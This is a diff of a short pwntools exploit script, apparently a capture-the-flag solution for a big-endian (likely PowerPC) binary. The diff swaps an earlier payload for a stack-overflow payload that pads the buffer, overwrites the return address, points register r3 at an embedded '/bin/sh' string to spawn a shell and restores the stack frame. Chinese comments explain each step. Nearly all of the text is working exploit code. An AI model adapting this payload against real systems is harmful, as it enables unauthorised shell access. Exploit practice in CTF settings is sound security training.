@@ -26,20 +26,11 @@ input("Press Enter when GDB is properly connected...")
 p.recvuntil(b"pwn: ")
 
 # Use the existing /bin/sh string at 0x10077a8c
-cmd_addr = 0x100bef28 - 8
-
-# Craft payload
-payload = p32(cmd_addr)
-payload += p32(cmd_addr)
-payload += p32(cmd_addr)
-payload += p32(cmd_addr)
-payload += p32(cmd_addr)
-payload += p32(cmd_addr)
-payload += p32(0x10077a8c)
-
-payload += p32(0x100005f8)      # Address of win function
-payload += p32(cmd_addr)  
-payload += p32(cmd_addr)        # First argument to win (address of "/bin/sh")
+payload = b"A" * 20 + b"\x10\x0b\xef\x20" # 控制栈顶 (control the top of stack)
+payload += b"\xde\xad\xbe\xef" + b"\x10\x00\x06\x10" # 控制返回地址  (control return address)
+payload += b"\x40\x7f\xfd\x8c" # 控制$r3，指向"/bin/sh" (control r3, point to "/bin/sh")
+payload += b"/bin/sh" + b"\00"*9 
+payload += b"\x10\x00\x06\x34" + b"\x40\x7f\xfb\x60" + b"\x10\x00\x08\x04" # 维护原本栈帧
 
 p.sendline(payload)
 
